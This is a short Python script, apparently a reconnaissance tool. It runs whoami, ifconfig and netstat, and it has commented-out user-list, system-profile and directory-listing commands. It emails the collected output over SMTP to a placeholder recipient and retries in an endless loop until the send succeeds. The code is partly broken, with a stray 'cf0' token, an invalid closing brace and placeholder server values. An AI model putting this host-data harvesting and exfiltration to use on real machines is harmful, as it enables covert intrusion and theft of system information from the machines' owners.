import subprocess
import smtplib

#ls = subprocess.Popen("ls -R", shell=True, stdout=subprocess.PIPE).stdout.read()
#dscl = subprocess.Popen("dscl . list /Users", shell=True, stdout=subprocess.PIPE).stdout.read()
#sysPro = subprocess.Popen("system_profiler", shell=True, stdout=subprocess.PIPE).stdout.read()

ifc = subprocess.Popen("ifconfig", shell=True, stdout=subprocess.PIPE).stdout.read()
nst =  subprocess.Popen("netstat", shell=True, stdout=subprocess.PIPE).stdout.read()
cf0 who = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE).stdout.read()

#harvest =  who + ifc + nst + dscl + sysPro + ls
#commented as time consuming processes and output is very verbose
#TODO: add capacity to send text file as attachment

#f = open('testSubProRecon.txt','w')
#f.write(harvest)
#f.close()

body = who + ifc + nst

msg = """From: sender@email
To: recipient@email
MIME-Version: 1.0
Content-type: text
Subject: test


 """
message = msg + body

while True: 
	try: 
		server = smtplib.SMTP('sever', port)
		server.starttls()
		server.login('sender@emai','password')
		server.sendmail('sender@email','recipient@email', message)
		break
	except: 
		print("Error: unable to send email.  Trying again")
		continue
}
